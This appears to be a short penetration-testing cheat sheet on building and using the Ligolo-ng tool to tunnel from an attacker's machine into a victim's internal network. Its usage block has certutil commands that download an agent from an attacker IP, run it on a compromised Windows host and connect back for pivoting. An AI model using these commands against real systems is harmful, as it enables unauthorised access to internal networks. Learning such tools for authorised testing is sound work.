![[what-is-tunneling-in-networking.svg]]

---

# ¿WHAT IS LIGOLO?
Ligolo allows you to establish a tunnel from your attacking machine to the victim's internal network. This practice is, for example, to enumerate internal devices in the victim's network without external visibility, so we compromise any machine with visibility to the internal network and thus be able to establish a tunnel that allows us vision to the network.
![[Pasted image 20241213194400.png]]

**Link Reference:** https://hackingepico.com/posts/LIGOLO-NG-Tutorial/

# INSTALL
```shell
sudo apt update
sudo apt install git make gcc golang-go

git clone https://github.com/nicocha30/ligolo-ng
cd ligolo-ng
make
sudo cp dist/ligolo-ng-proxy-linux_amd64 /usr/local/bin/ligolo
```

# USAGE
```shell
#LINUX MACHINE
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.81.0/24 dev ligolo
ligolo -selfcert -laddr 0.0.0.0:4433

python3 -m http.server 80


#WINDOWS
certutil.exe -f -urlcache -split http://192.168.45.189/dist/ligolo-ng-agent-windows_amd64.exe
.\ligolo-ng-agent-windows_amd64.exe -connect 192.168.45.189:4433 -ignore-cert -retry


#LINUX
ligolo-ng >> session
ligolo-ng >> 1
ligolo-ng >> start
```